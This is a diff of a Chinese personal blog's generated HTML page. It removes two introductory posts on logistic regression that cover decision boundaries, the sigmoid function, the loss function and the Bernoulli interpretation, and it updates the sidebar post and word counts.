-          <h1 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h1><h2 id="一：复杂的分类问题"><a href="#一：复杂的分类问题" class="headerlink" title="一：复杂的分类问题"></a>一：复杂的分类问题</h2><h3 id="1-直线决策边界"><a href="#1-直线决策边界" class="headerlink" title="1. 直线决策边界"></a>1. 直线决策边界</h3><p>通过 x<sub>1</sub> 和 x<sub>2</sub> 去判断 y的值</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141044914.png" style="zoom: 33%;">
-
-<p>概念分布函数</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141306835.png" style="zoom: 50%;">
-
-<p>核心问题：找到 g(x)，即蓝色的直线；</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141349124.png" style="zoom:50%;">
-
-<p>决策边界：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141504765.png" style="zoom:50%;">
-
-<h3 id="2-圆形决策边界"><a href="#2-圆形决策边界" class="headerlink" title="2. 圆形决策边界"></a>2. 圆形决策边界</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141701950.png" style="zoom: 33%;">
-
-<p>获取概念分布，逻辑回归方程：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141808332.png" style="zoom: 50%;">
-
-<p>圆形的 g(x) 与直线的 g(x) 不同，新增了2此项。由此获取一个曲线或者圆形。</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142014947.png" style="zoom: 50%;">
-
-<p>决策边界：</p>
-<p><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142059035.png"></p>
-<h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h3><ul>
-<li>当使用逻辑回归去求解问题时，核心即找到决策边界。</li>
-<li>逻辑回归结合多项式的边界函数，可以解决复杂的分类问题。<ul>
-<li>线性边界，即多项式为1次；</li>
-<li>圆形边界，即多项式为2次；</li>
-</ul>
-</li>
-</ul>
-<h2 id="二：逻辑回归问题求解"><a href="#二：逻辑回归问题求解" class="headerlink" title="二：逻辑回归问题求解"></a>二：逻辑回归问题求解</h2><ul>
-<li>概念分布函数</li>
-<li>对应的边界函数关系</li>
-</ul>
-<h3 id="1-寻找类别边界"><a href="#1-寻找类别边界" class="headerlink" title="1. 寻找类别边界"></a>1. 寻找类别边界</h3><p>根据训练样本，寻找类别边界；</p>
-<p>即：根据训练样本，寻找找 θ<sub>0</sub>、θ<sub>1</sub>、θ<sub>2</sub></p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142629280.png" style="zoom:50%;">
-
-<h3 id="2-如何求解系数"><a href="#2-如何求解系数" class="headerlink" title="2.  如何求解系数"></a>2.  如何求解系数</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142953201.png" style="zoom:50%;">
-
-<p>分类问题，标签与预测结果都是离散的点，使用该损失函数无法寻找到极小值点。</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112143359941.png" style="zoom: 50%;">
-
-<p>图像：</p>
-<p><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/20200407084418389.png"></p>
-<p>等效转换关系式：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112144946188.png" style="zoom: 50%;">
-
-<p>带入P(x)，求解</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112145047414.png" style="zoom:50%;">
-
-<p>采用梯度下降法，获取最小化的损失函数 J</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112145205900.png" style="zoom:50%;">
-
-<h2 id="三：命名问题"><a href="#三：命名问题" class="headerlink" title="三：命名问题"></a>三：命名问题</h2><p>逻辑回归的主要场景是分类问题，称其为逻辑回归是否合适，为什么？</p>
-<p>逻辑回归虽然名字中有回归，但实际上它是一个<code>二分类算法</code>。</p>
-<p>逻辑回归实际上就是在多元线性回归（θᵀx）的基础上，多嵌套了一个函数，这个函数就是 sigmoid 函数，也被称为 S 型曲线。 </p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112153624030.png" style="zoom: 67%;">
-
-<p>简化表达：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112153714798.png" style="zoom:67%;">
-
-<p>函数图像：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112162347188.png" style="zoom:50%;">
-
-<p style="text-indent:2em">由 sigmoid 函数图像看知，其值域为(0,1)。因此逻辑回归就是在多元线性回归的基础上，讲结果缩放到了0 和 1 之间。</p>
-
-<p style="text-indent:2em">当我们通过线性函数得到一个结果，这个结果越小于0，函数输出就越接近0；结果越大于0，函数输出就越接近1，而分类算法的输出一般情况下都会是 input 属于某个类别的概念大小，因此用0到1之间的范围刚好可以表示概念。中间的0.5则将结果划分为两个类别。所以，我们可以简单的将 sigmoid 函数理解成一个将输出转化为属于某个类别的概念的函数。</p>
-
-<p style="text-indent:2em">综上所述，逻辑回归的大体思想就是，多元线性回归算法回归出一个分类超平面，预测样本通过代入这个超平面，如果是负就说明在这个超平面的下方，如果是正就说明是在这个超平面的上方。再通过 sigmoid 转换为概率，最好通过概率输出类别。</p>
-
-<h2 id="四：逻辑回归统计学模型：伯努利分布"><a href="#四：逻辑回归统计学模型：伯努利分布" class="headerlink" title="四：逻辑回归统计学模型：伯努利分布"></a>四：逻辑回归统计学模型：伯努利分布</h2><p style="text-indent:2em">我们知道，对于二分类算法，样本只有两个标签，要么是0要么是1，并且二分类有一个特点，那就是我们最终预测样本的概念，正例加上负例的概念总和是1。即每一次预测我们都可以这样表示：</p>
-
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112164826386.png" style="zoom:50%;">
-
-<p>这个公式不就是伯努利分布（0-1分布）嘛！</p>
-<p>因此，对于模型每一次预测的输出，我们都可以写成伯努利分布的形式：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112164938371.png" style="zoom:50%;">
-
-<p>细微差异：</p>
-<p>伯努利分布中，最经典的案例就是抛硬币。只不过在抛硬币前我们已经假设概率是对半分的。</p>
-<p>但是在逻辑回归中，概念是需要通过每一次模型预测给出的。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/" class="post-title-link" itemprop="url">AI_逻辑回归（1）</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-12 13:17:29 / 修改时间：13:40:50" itemprop="dateCreated datePublished" datetime="2022-11-12T13:17:29+08:00">2022-11-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" itemprop="url" rel="index"><span itemprop="name">人工智能</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h1><h2 id="一：分类任务"><a href="#一：分类任务" class="headerlink" title="一：分类任务"></a>一：分类任务</h2><p>任务：根据余额判断小明是否会去看电影；</p>
-<p>训练数据：</p>
-<p>余额为1、2、3、4、5，看电影（正样本）</p>
-<p>余额为-1、-2、-3、-4、-5，不看电源（负样本）</p>
-<p>作图：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132044937.png" style="zoom: 50%;">
-
-<h2 id="二：线性回归预测"><a href="#二：线性回归预测" class="headerlink" title="二：线性回归预测"></a>二：线性回归预测</h2><h3 id="1-预测结果"><a href="#1-预测结果" class="headerlink" title="1. 预测结果"></a>1. 预测结果</h3><p><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132324518.png"></p>
-<h3 id="2-存在问题"><a href="#2-存在问题" class="headerlink" title="2. 存在问题"></a>2. 存在问题</h3><p>当样本量变大以后，准确率会下降；</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132447332.png" style="zoom:50%;">
-
-<p>当 x&#x3D;1 时，受到很远处离散点的影响，预测结果开始出现偏差。</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132511717.png" style="zoom:50%;">
-
-<h2 id="三：逻辑回归预测"><a href="#三：逻辑回归预测" class="headerlink" title="三：逻辑回归预测"></a>三：逻辑回归预测</h2><h3 id="1-逻辑回归方程"><a href="#1-逻辑回归方程" class="headerlink" title="1.  逻辑回归方程"></a>1.  逻辑回归方程</h3><p><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132723062.png"></p>
-<h3 id="2-函数图像"><a href="#2-函数图像" class="headerlink" title="2. 函数图像"></a>2. 函数图像</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132801192.png" style="zoom:50%;">
-
-<h3 id="3-预测结果"><a href="#3-预测结果" class="headerlink" title="3. 预测结果"></a>3. 预测结果</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112132833753.png" style="zoom:67%;">
-
-<p>由上可知，相比线性回归而言，采用逻辑回归拟合数据，可以更好的完成分类任务！</p>
-<h2 id="四：逻辑回归"><a href="#四：逻辑回归" class="headerlink" title="四：逻辑回归"></a>四：逻辑回归</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>用于解决<code>分类问题</code>的一种模型。</p>
-<p>根据数据特征或者属性，计算其归属于某一类别的概念P(x)，根据概念数值判断其所属类别。</p>
-<h3 id="2-应用场景"><a href="#2-应用场景" class="headerlink" title="2. 应用场景"></a>2. 应用场景</h3><p>二分类问题</p>
-<h3 id="3-数学表达式"><a href="#3-数学表达式" class="headerlink" title="3. 数学表达式"></a>3. 数学表达式</h3><p>逻辑回归方程，也称作 sigmoid 方程。</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112133325084.png" style="zoom:50%;">
-
-<h3 id="4-典型逻辑回归概念分布曲线"><a href="#4-典型逻辑回归概念分布曲线" class="headerlink" title="4. 典型逻辑回归概念分布曲线"></a>4. 典型逻辑回归概念分布曲线</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112133548301.png" style="zoom:50%;">
-
-<h3 id="5-任务预测"><a href="#5-任务预测" class="headerlink" title="5. 任务预测"></a>5. 任务预测</h3><p>根据余额判断小明是否会去看电影（余额-10，100）</p>
-<p>逻辑回归方程：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112133800325.png" style="zoom:50%;">
-
-<p>带入参数值，获得结果：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%881%EF%BC%89/image-20221112133827988.png" style="zoom:50%;">
-
-<p>结论：</p>
-<p>余额 -10，即 y &#x3D; 0，不去看电影；</p>
-<p>余额 100，即 y &#x3D; 1，去看电影；</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1267,7 +1239,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1334,7 +1306,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">本博客全站共32.6k字</span>
+  <span class="post-count">本博客全站共33.9k字</span>
 </div>
 
 
